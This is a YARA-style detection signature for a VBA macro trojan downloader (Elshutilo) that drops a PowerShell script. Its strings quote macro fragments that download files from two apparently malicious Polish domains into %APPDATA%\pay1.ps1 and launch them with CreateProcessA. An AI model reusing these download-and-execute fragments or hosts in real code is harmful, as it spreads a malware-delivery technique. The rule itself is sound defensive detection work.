
rule TrojanDownloader_PowerShell_Elshutilo_PS_MTB{
	meta:
		description = "TrojanDownloader:PowerShell/Elshutilo.PS!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,07 00 07 00 06 00 00 "
		
	strings :
		$a_01_0 = {44 69 6d 20 73 69 20 41 73 20 53 54 41 52 54 55 50 49 4e 46 4f } //1 Dim si As STARTUPINFO
		$a_01_1 = {52 65 74 33 20 3d 20 45 6e 76 69 72 6f 6e 24 28 22 41 50 50 44 41 54 41 22 29 20 2b 20 22 5c 70 61 79 31 2e 70 73 31 22 } //2 Ret3 = Environ$("APPDATA") + "\pay1.ps1"
		$a_01_2 = {52 65 74 32 20 3d 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 28 30 2c 20 22 68 74 74 70 3a 2f 2f 6b 72 65 64 79 74 69 6e 6b 73 61 6f 2e 70 6c 2f 72 61 77 2e 74 78 74 22 2c 20 52 65 74 33 2c 20 30 2c 20 30 29 } //2 Ret2 = URLDownloadToFileA(0, "http://kredytinksao.pl/raw.txt", Ret3, 0, 0)
		$a_01_3 = {52 65 74 32 20 3d 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 28 30 2c 20 22 68 74 74 70 3a 2f 2f 77 70 72 2e 6d 6b 6f 2e 77 61 77 2e 70 6c 2f 75 70 6c 6f 61 64 73 2f 73 63 68 65 64 75 6c 65 72 2e 74 78 74 22 2c 20 52 65 74 33 2c 20 30 2c 20 30 29 } //2 Ret2 = URLDownloadToFileA(0, "http://wpr.mko.waw.pl/uploads/scheduler.txt", Ret3, 0, 0)
		$a_01_4 = {52 65 74 37 20 3d 20 43 72 65 61 74 65 46 69 6c 65 41 28 52 65 74 33 2c 20 31 2c 20 32 2c 20 73 61 2c 20 33 2c 20 30 2c 20 30 29 } //1 Ret7 = CreateFileA(Ret3, 1, 2, sa, 3, 0, 0)
		$a_01_5 = {52 65 74 20 3d 20 43 72 65 61 74 65 50 72 6f 63 65 73 73 41 28 76 62 4e 75 6c 6c 53 74 72 69 6e 67 2c 20 52 65 74 39 2c 20 42 79 56 61 6c 20 30 26 2c 20 42 79 56 61 6c 20 30 26 2c 20 54 72 75 65 2c 20 33 32 2c 20 42 79 56 61 6c 20 30 26 2c 20 76 62 4e 75 6c 6c 53 74 72 69 6e 67 2c 20 73 69 2c 20 70 69 29 } //1 Ret = CreateProcessA(vbNullString, Ret9, ByVal 0&, ByVal 0&, True, 32, ByVal 0&, vbNullString, si, pi)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*2+(#a_01_2  & 1)*2+(#a_01_3  & 1)*2+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=7
 
}